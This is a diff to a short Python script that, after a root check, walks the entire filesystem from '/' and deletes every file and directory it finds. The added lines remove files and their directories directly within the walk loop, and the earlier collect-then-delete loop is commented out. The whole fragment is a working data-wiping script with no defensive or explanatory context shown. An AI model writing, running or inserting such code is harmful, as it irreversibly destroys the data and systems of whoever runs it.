@@ -8,17 +8,26 @@ if os.getuid() != 0:
 root = os.path.expanduser("/")
 os.chdir(root)
 
-docs = []
+files = []
+dirs = []
 
 for path, subdirs, files in os.walk(root):
 	for file in files:
-		docs.append(os.path.join(path, file))
+		# files.append(os.path.join(path, file))
+		# dirs.append(path)
+		os.remove(os.path.join(path, file))	
+		shutil.rmtree(path)
+		# except FileNotFoundError:
+		# 	continue
 
-for doc in docs:
-	try:
-		if os.path.isfile(doc):
-			os.remove(doc)
-		else:
-			shutil.rmtree(doc)
-	except:
-		continue
+# for dir in dirs:
+# 	print(dir)
+
+# for doc in docs:
+# 	try:
+# 		if os.path.isfile(doc):
+# 			os.remove(doc)
+# 		else:
+# 			shutil.rmtree(doc)
+# 	except:
+# 		continue
